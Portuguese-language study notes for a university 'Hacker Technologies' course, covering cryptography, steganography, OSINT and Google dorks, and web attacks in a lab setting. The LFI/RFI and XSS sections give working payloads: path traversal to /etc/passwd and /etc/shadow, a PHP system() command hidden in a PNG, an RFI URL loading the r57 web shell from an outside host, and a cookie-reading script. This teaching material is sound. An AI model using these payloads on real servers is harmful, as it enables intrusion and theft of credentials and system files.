# Tecnologias Hacker - Resumo Parte 2

Roteiros e Resumo da disciplina Tecnologias Hacker

## CRIPTOGRAFIA (ocultar escrita)

**Definição:** é a ciência da transformação de texto simples em texto ilegível, de tal modo que apenas quem saiba qual o processo de reverter a transformação possa recuperar o texto original.

**Encripação:** Processo de `cifrar` ou esconder uma informação

**Decriptação:** Processo de converter dados encriptados de volta ao formato original, ou seja, `decifrar`

**Objetivos:**

- Confidencialidade de mensagens (só o destinatário é capaz de extrair o conteúdo da mensagem)
- Detectar se uma mensagem foi alterada durante a transmissão
- Possibilitar que o destinatário identifique o remetente da mensagem
- Assinatura Digital

## ESTEGNOGRAFIA

Esteganografia é uma técnica que consiste em esconder um arquivo dentro do outro, de forma criptografada.

- steghide (comando para aplicar uma Estegnografia): suporte para jpeg, bmp, wav e au.

Embedar um arquivo em uma imagem:

```cmd
steghide embed -cf IMAGEM -ef TEXTO
```

Extrair arquivo de uma imagem

```cmd
steghide extract -sf ARQUIVO
```

### Exemplos de algorítimo

- Cifragem por substituição:
  - Simples: mapear caractere para outro (Cifra de Cesar - cada letra era mapeada para 3 posições a frente no alfabeto).
  - Homofônica: parece a simples, mas o mesmo caractere pode ser mapeado para mais de um caractere, seguindo padrões na descriptografa.
  - Poligrâmica: grupos de letras são substituídos por outras. (AAB -> RTA)
  - Cifra de Vinagrete: A mensagem é juntada com uma frase aleatória, que funcionam como linha e coluna na tabela, para formar a cifra.
  - Cifra por transposição: os caracteres permancem os mesmos, mas em ordem diferente

### Criptografia Simétrica

O algoritimo de criptrografia utiliza uma chave (segredo) para criptografar os dados que queremos proteger, e utiliza a mesma chave para fazer a descriptografia

### Criptografia Assimétrica

Utiliza-se duas chaves: `chave pública` e `chave privada` no processo de proteção de dados. O algorítimo utiza a chave pública para criptografar os dados que queremos proteger, e para descriptografar, utiliza-se a chave privada.

A criptografia assimétrica normalmente é mais lenta do que a simétrica, por isso em soluções web normalmenta há uma mescla desses dois algorítimos.

Exemplo:

- Envio de informações confidenciais via https em um site web: ao acessar uma página de forma autenticada (autenticação digital), o servidor envia sua chave pública para o computador cliente. Este por sua vez criptografa seus dados confidenciais com uma chave simétrica. Para enviar essa chave para o servidor, de modo que não haja riscos de interceptação, ocorre uma criptografia dessa chave com a chave pública do servidor, que é descriptografado com a chave privada.

### SSL Secure Socket Layer

- É uma camada de rede que pode ser usada por diversas aplicações, equivale à camada 5 (sessão) do modelo OSI. O mais comum é usá-lo para fornecer comunicação privada entre servidores de páginas (web) e seus clientes (navegadores).

- O protocolo HTTP com o SSL se chama HTTPS e usa a porta 443 no lugar da porta 80.

- Associação entre um cliente e o servidor. Criada pelo protocolo handshake (aperto de mão). Define os parâmetros criptográficos de segurança.

- Permite que servidor e cliente se autentiquem (autenticação mútua)

---

## OSINT (Open Source Intelligence)

É possível encontrar muitas vulnerabilidades com informações disponíveis na internet, abertas para qualquer pessoa visualizar

### Osint FrameWork

https://osintframework.com/

Framework que mostra ferramentas disponíveis para coletar informações nos mais diferentes aspectos, como email, username, endereço de ip, informações financeiras, documentos, entre outros

### Google Dork

Utilização de mecanismos de pesquisa para encontrar informações na internet, utilizando a ferramenta de pesquisa do Google. (https://gist.github.com/sundowndev/283efaddbcf896ab405488330d1bbc06#file-googledorking-md)

Operadores:

- Aspas para buscar por expressões exatas. Ex: "aulas de pentest"
- Busca em domínios específicos. Ex: site:edu.br
- Formatos específicos de arquivo. Ex: filetype:pdf
- Asterisco funciona como coringa. Ex: "Rodolfo \* Avelino"
- Unir diferentes operadores. Ex: site:twitter.com "Rodolfo Avelino"
- Sinal de menos para excluir termo. Ex: cloroquina -covid
- Busca por string em url (endereço): EX: inurl: Index of /logs
- Busca por texto: EX: intext "indexof" ".sql"

Busca Booleana

- AND: pesquisar dois ou mais termos simultaneamente. Espaço em branco também faz esse papel. Ex: "Ransomware" AND "TV Record";
- OR ou pipeline (|): pesquisar um ou outro termo "Rodolfo Avelino" OR Avelinux;
- Parênteses para isolar o termo. Ex: (cloroquina OR ivermectina) AND (pandemia OR covid)

Exemplos importantes:

Buscar vulnerabilidades com LFI:

```
inurl:"index.php?page="
```

### Exbloit DB

Ferramenta para obter pesquisas no Google que com frequência retornam vulnerabilidades em servidores.

https://www.exploit-db.com/google-hacking-database

---

## LFI (Local File Inclusion) e RFI (Remote File Inclusion)

Inclusão de arquivos em servidores, de tal forma que se torna possível ter acessos de dados do Servidor. O LFI utiliza arquivos locais, já o RFI utiliza arquivos em sorvidores comprometidos. As URLs que costumam ser alvo de ataques, terminam com:

- p=
- page=
- site=
- content=

**Exemplo de LFI:** adicionar após `/?page==` a estrutura de pastas `../../../../../../../../etc/passwd`, a fim de obter o arquivo passwd:

```cmd
http://localhost:8000/vulnerabilities/fi/?page==../../../../../../../../etc/passwd
```

Para obter esse valor, com conversão base64 (para conseguir passar o filtro que alguns servidores colocam)

```cmd
http://localhost:8000/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=/etc/passwd
```

Outros arquivos explorados em ataques:

- /etc/issue
- /proc/version
- /etc/profile
- /etc/passwd
- /etc/shadow
- /root/.bash_history
- /var/spool/cron/crontabs/root

**Exemplo de RFI:** contaminar um servidor comprometido com um arquivo com metadados que tentam executar ou obter informações comprometidas dele.

Criar imagem para contaminar um servidor

```cmd
convert -size 32x32 xc:blue aula.png
```

Observar metadados de arquivos

```cmd
hexdump -C aula.png
```

Passar metadados para o arquivo: comando para observar o arquivo de passwd de uma servidor

```cmd
echo "<?php system('cat /etc/passwd'); ?>" >> aula.png
```

Com o RFI também é possível fazer injeção de Shells para execução de comandos dentro do servidor:

```cmd
http://IPALVO/index.php?page=https://57.webshellarchive.org/r57.txt
```

## XSS (Reflected and Stored)

- Reflected: não fica salvo para todos os usuários
- Stored: Permanece para os outros usuários

Uma maneira de rodar comandos dentro de um servidor vulnerável. É possível inserir scripts em inputs, se não for feito a sanetização correta.

```cmd
<script>alert(document.cookie)</script>
```

## Comandos importantes

Listar diretórios de um site

```cmd
wget --spider -r --no-parent www.insper.edu.br
```

Utilizar o comando find para encontrar as flags

```cmd
find / -user flag -perm -u=s 2>/dev/null
```

```cmd
find ~/ -type f -name "*.py"
```

## Clientes importantes

- porta ftp: https://www.makeuseof.com/best-ftp-clients-for-linux/ (FileZila)

- porta smb: No Gerenciados de Arquivos (Files), ir em:
  - Other Locations
  - Em `connect to server` digitar: smb://{ip_alvo}
